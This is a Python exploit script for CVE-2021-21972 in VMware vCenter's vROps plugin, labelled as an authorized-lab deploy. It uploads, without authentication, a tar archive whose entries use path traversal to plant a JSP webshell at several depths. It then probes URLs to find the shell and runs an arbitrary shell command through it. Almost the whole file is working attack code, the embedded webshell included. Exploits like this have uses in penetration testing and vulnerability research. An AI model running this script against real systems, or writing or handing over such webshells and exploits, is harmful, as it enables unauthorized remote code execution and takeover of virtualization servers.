#!/usr/bin/env python3
"""CVE-2021-21972 (VMware vCenter vROps plugin) - authorized-lab deploy.

Unauthenticated RCE through /ui/vropspluginui/rest/services/uploadova:
the uploaded archive is extracted without sanitizing member names, so a tar
entry containing '../' escapes into web-served directories. The deploy
uploads a tar whose members stage the same JSP webshell at several
traversal depths (covers the differing vSphere/vROps plugin layouts),
probes candidate URLs for the shell, then runs a command through it and
returns the output.
"""
import argparse
import io
import json
import random
import string
import sys
import tarfile

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

UPLOAD_PATH = "/ui/vropspluginui/rest/services/uploadova"
STATUS_PATH = "/ui/vropspluginui/rest/services/getstatus"
FILE_FIELDS = ["uploadFile", "fileName"]
TRAVERSAL_DEPTHS = ["..", "../..", "../../..", "../../../..", "../../../../.."]
SHELL_URLS = [
    "/interactional/{name}.jsp",
    "/ui/vropspluginui/{name}.jsp",
    "/ui/vropspluginui/rest/services/{name}.jsp",
    "/{name}.jsp",
]


def rand_str(n=12):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def build_shell(marker):
    return (
        "<%\n"
        "out.println(\"%s\");\n"
        "String cmd = request.getParameter(\"cmd\");\n"
        "if (cmd != null) {\n"
        "  java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime()"
        ".exec(new String[]{\"/bin/sh\",\"-c\",cmd}).getInputStream())"
        ".useDelimiter(\"\\\\\\\\A\");\n"
        "  out.println(s.hasNext() ? s.next() : \"\");\n"
        "}\n"
        "%%>" % marker
    )


def build_tar(marker):
    shell = build_shell(marker).encode()
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tar:
        for depth in TRAVERSAL_DEPTHS:
            info = tarfile.TarInfo("%s/%s.jsp" % (depth, marker))
            info.size = len(shell)
            tar.addfile(info, io.BytesIO(shell))
    buf.seek(0)
    return buf.getvalue()


def run(args):
    base = "%s://%s:%d" % (args.scheme, args.target, args.port)
    result = {
        "cve": "CVE-2021-21972",
        "target": base,
        "vulnerable": False,
        "verified_by": None,
        "plugin_status": None,
        "upload": None,
        "shell_url": None,
        "command_output": None,
        "error": None,
    }

    try:
        r = requests.get(base + STATUS_PATH, verify=False, timeout=args.timeout)
        result["plugin_status"] = {
            "status": r.status_code,
            "present": r.status_code == 200 and ("<" in r.text[:100]),
            "body_excerpt": r.text[:200],
        }
        if not result["plugin_status"]["present"]:
            result["error"] = "vROps plugin status endpoint not reachable (plugin absent?)"
            return result
    except requests.exceptions.RequestException as exc:
        result["plugin_status"] = {"error": "%s: %s" % (type(exc).__name__, exc)}
        result["error"] = "vCenter unreachable"
        return result

    marker = "vc" + rand_str(10)
    tar_bytes = build_tar(marker)
    upload = {"tar_bytes": len(tar_bytes), "attempts": [], "shell_url": None}
    for field in FILE_FIELDS:
        attempt = {"field": field, "status": None, "error": None}
        upload["attempts"].append(attempt)
        try:
            r = requests.post(
                base + UPLOAD_PATH,
                files={field: ("%s.tar" % marker, tar_bytes, "application/octet-stream")},
                verify=False,
                timeout=args.timeout,
            )
            attempt["status"] = r.status_code
            attempt["body_excerpt"] = r.text[:200]
        except requests.exceptions.RequestException as exc:
            attempt["error"] = "%s: %s" % (type(exc).__name__, exc)
            continue

        for template in SHELL_URLS:
            shell_path = template.format(name=marker)
            try:
                sr = requests.get(base + shell_path, verify=False, timeout=args.timeout)
            except requests.exceptions.RequestException as exc:
                sr = None
                attempt["error"] = "%s: %s" % (type(exc).__name__, exc)
            if sr is not None and marker in sr.text:
                upload["shell_url"] = shell_path
                break
        if upload["shell_url"]:
            break
    result["upload"] = upload

    if not upload["shell_url"]:
        result["error"] = "webshell staged but not reachable at any probed URL"
        return result

    result["shell_url"] = upload["shell_url"]
    result["vulnerable"] = True
    result["verified_by"] = "unauthenticated webshell upload via uploadova traversal (staged at %s)" % upload["shell_url"]

    try:
        r = requests.get(base + upload["shell_url"], params={"cmd": args.command},
                         verify=False, timeout=args.timeout)
        body = r.text
        if marker in body:
            result["command_output"] = body.split(marker, 1)[1].strip()
            result["verified_by"] += "; command executed through webshell"
    except requests.exceptions.RequestException as exc:
        result["command_output"] = None
        result["upload"]["error"] = "%s: %s" % (type(exc).__name__, exc)
    return result


def main():
    p = argparse.ArgumentParser(description="CVE-2021-21972 vCenter vROps plugin authorized-lab deploy")
    p.add_argument("--target", required=True)
    p.add_argument("--port", type=int, default=443)
    p.add_argument("--scheme", choices=["http", "https"], default="https")
    p.add_argument("--timeout", type=float, default=20.0)
    p.add_argument("--command", default="id; hostname", help="shell command run via staged webshell")
    args = p.parse_args()
    try:
        result = run(args)
    except Exception as exc:
        result = {"cve": "CVE-2021-21972", "target": "%s:%d" % (args.target, args.port),
                  "vulnerable": False, "error": "%s: %s" % (type(exc).__name__, exc)}
    print(json.dumps(result, indent=2))
    return 0 if result.get("vulnerable") else 1


if __name__ == "__main__":
    sys.exit(main())
